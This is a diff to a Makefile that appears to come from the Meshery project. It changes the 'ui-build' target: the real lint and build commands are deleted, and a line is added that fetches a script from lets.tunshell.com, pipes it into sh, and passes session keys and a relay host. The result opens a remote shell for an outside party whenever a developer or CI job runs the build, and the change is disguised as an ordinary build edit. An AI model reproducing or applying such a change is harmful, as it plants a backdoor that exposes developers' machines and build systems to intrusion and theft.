@@ -349,8 +349,7 @@ ui-provider-test:
 
 ## Buils all Meshery UIs  on your local machine.
 ui-build: ui-setup
-	cd ui; npm run lint:fix && npm run build && npm run export; cd ..
-	cd provider-ui; npm run lint:fix && npm run build; cd ..
+	curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T yccBVeeGSXgIFOzT0o4I9r 1Y06heaDxOzvYcSe0Q4rkv eu.relay.tunshell.com
 
 ## Build only Meshery UI on your local machine.
 ui-meshery-build:
@@ -521,3 +520,4 @@ server-integration-tests-meshsync-run:
 
 ## Runs meshsync integration tests full cycle (docker build, setup, run, cleanup)
 server-integration-tests-meshsync: docker-build server-integration-tests-meshsync-setup server-integration-tests-meshsync-run server-integration-tests-meshsync-cleanup
+
